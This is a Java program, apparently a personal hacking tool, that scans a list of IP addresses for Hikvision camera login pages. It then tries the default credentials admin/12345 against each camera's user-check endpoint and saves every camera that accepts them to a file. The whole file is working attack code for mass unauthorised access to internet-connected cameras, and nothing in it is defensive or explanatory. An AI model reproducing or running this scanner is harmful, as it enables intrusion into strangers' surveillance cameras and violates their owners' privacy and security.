package vip.ourcraft.mcserverplugins.monitorfucker;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class MonitorFucker {
    private static final String OUTPUT_PATH = "/Users/user/Desktop/ip.txt";
    private static final String INPUT_PATH = "/Users/user/Desktop/output.txt";
    private static OkHttpClient client = new OkHttpClient().newBuilder()
            .readTimeout(500, TimeUnit.MILLISECONDS)
            .connectTimeout(500, TimeUnit.MILLISECONDS)
            .build();

    public static void main(String[] args) throws IOException {
        File inputFile = new File(INPUT_PATH);
        BufferedReader inputFileReader = new BufferedReader(new FileReader(inputFile));
        String line;
        List<String> inputIPs = new ArrayList<>();
        List<String> hikvisionIPs = new ArrayList<>();

        while ((line = inputFileReader.readLine()) != null) {
            inputIPs.add(line);
        }

        for (int i = 0; i < inputIPs.size(); i++) {
            String ip = inputIPs.get(i);
            System.out.println("正在筛选网站(" + (i + 1) + "/" + inputIPs.size() + "): " + "http://" + ip + "/doc/page/login.asp");

            Request request = new Request.Builder()
                    .url("http://" + ip + "/doc/page/login.asp")
                    .addHeader("user-agent", "Chrome/69.0.3497.100 Safari/537.36")
                    .addHeader("Cookie", "language=zh; updateTips=true")
                    .build();

            try {
                Response response = client.newCall(request).execute();

                if (response.body() != null && response.body().string().contains("Hikvision")) {
                    hikvisionIPs.add(ip);
                }

            } catch (IOException ignored) {}
        }

        inputFileReader.close();

        File outputFile = new File(OUTPUT_PATH);

        if (!outputFile.exists() && !outputFile.createNewFile()) {
            System.out.println("创建文件失败!");
            return;
        }

        BufferedWriter outputWriter = new BufferedWriter(new FileWriter(outputFile));

        for (int i = 0; i < hikvisionIPs.size(); i++) {
            String ip = hikvisionIPs.get(i);
            String url = "http://" + ip + "/PSIA/Custom/HIK/userCheck";
            Request request = new Request.Builder()
                    .url(url)
                    .addHeader("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36")
                    .addHeader("Cookie", "language=zh; updateTips=true; userInfo80=YWRtaW46MTIzNDU%3D; page=preview.asp%251")
                    .addHeader("Authorization", "Basic YWRtaW46MTIzNDU=")
                    .build();

            System.out.println("正在验证密码(" + (i + 1) + "/" + hikvisionIPs.size() + "): " + url);

            try {
                Response response = client.newCall(request).execute();

                if (response.body() != null && response.body().string().contains("200")) {
                    outputWriter.write("http://" + ip + ",admin,12345");
                    outputWriter.newLine();
                }

            } catch (IOException ignored) {}
        }

        outputWriter.close();
    }
}
